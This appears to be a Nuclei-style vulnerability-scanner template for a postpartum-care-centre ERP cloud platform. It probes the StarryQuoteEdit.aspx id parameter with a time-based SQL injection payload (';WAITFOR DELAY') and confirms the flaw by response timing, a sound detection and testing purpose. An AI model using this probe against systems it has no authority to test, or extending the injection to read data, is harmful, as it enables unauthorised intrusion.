id: poc-yaml-jintongfang-erp-starryquoteedit-upload
info:
  name: 月子会所ERP管理云平台 StarryQuoteEdit.aspx接口SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    product: 月子会所ERP管理云平台

variables:
  t1: "{{rand_int(5, 9)}}"
  t2: "{{to_number(t1) + 2}}"
  t3: "{{rand_int(1, 4)}}"
  t4: "{{to_number(t3) + 2}}"

http:
  - raw:
      - |
        GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "contains(http.body, '月子会所ERP管理云平台')"
          - "response.duration >= to_number(t1) && response.duration <= to_number(t2)"

  - raw:
      - |
        GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:{{t3}}'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "contains(http.body, '月子会所ERP管理云平台')"
          - "response.duration >= to_number(t3) && response.duration <= to_number(t4)"
